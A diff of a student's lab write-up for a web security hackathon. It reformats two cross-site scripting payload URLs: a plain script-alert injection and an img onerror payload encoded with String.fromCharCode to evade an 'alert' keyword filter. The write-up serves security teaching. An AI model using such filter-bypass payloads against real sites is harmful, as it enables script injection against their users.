@@ -39,7 +39,8 @@ Below is the XSS code injected into the input form:
 
 Below is the XSS code injected into the URL:
 
-`https://waph-hackathon.eastus.cloudapp.azure.com/xss/level1/echo.php?input=<script>alert("Level 1-Hacked by Sophia Munoz")</script>`
+`https://waph-hackathon.eastus.cloudapp.azure.com/xss/level1/echo.php?
+input=<script>alert("Level 1-Hacked by Sophia Munoz")</script>`
 
 ![Level 1 Injected XSS and Payload Attack](../../images/level-1-attack.png)
 *Level 1 Injected XSS and Payload Attack*
@@ -99,7 +100,10 @@ I URL encoded the `&` in `&#115;`. The ampersand essentially acts as URL paramet
 
 Below is the XXS code injected into the URL:
 
-`https://waph-hackathon.eastus.cloudapp.azure.com/xss/level5/echo.php?input=<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,39,76,101,118,101,108,32,53,45,72,97,99,107,101,100,32,98,121,32,83,111,112,104,105,97,32,77,117,110,111,122,39,41))>`
+`https://waph-hackathon.eastus.cloudapp.azure.com/xss/level5/echo.php?input=<img src=x
+onerror=eval(String.fromCharCode(97,108,101,114,116,40,39,76,101,118,
+   101,108,32,53,45,72,97,99,107,101,100,32,98,121,32,83,111,112,104,
+   105,97,32,77,117,110,111,122,39,41))>`
 
 I used `fromCharCode` to encode `alert` as to not have it be detected. Assuming the method used was the `GET` method. The vulnerability is like the previous level, `echo $input`, but it now also includes `alert` instead of just `script`.
 
